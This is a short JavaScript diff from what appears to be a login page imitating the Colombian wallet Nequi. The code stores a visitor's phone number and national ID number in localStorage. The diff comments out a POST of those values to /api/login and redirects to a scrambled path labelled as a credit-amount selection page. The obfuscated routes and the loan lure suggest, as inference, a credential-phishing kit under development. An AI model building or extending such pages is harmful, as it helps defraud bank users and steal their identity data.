@@ -90,20 +90,21 @@ document.addEventListener('DOMContentLoaded', () => {
             localStorage.setItem('nequi_celular', celular);
             localStorage.setItem('nequi_cedula', cedula);
 
-            try {
-                // Send data to server (initial login)
-                await fetch('/api/login', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ celular, cedula })
-                });
-            } catch (error) {
-                console.error(error);
-            }
+            // try {
+            //     // Send data to server (initial login)
+            //     await fetch('/api/login', {
+            //         method: 'POST',
+            //         headers: {
+            //             'Content-Type': 'application/json'
+            //         },
+            //         body: JSON.stringify({ celular, cedula })
+            //     });
+            // } catch (error) {
+            //     console.error(error);
+            // }
 
-            navigateWithLoader("/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn");
+            // Redirect to Credit Amount Selection Page
+            navigateWithLoader("/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx");
         });
     }
 });
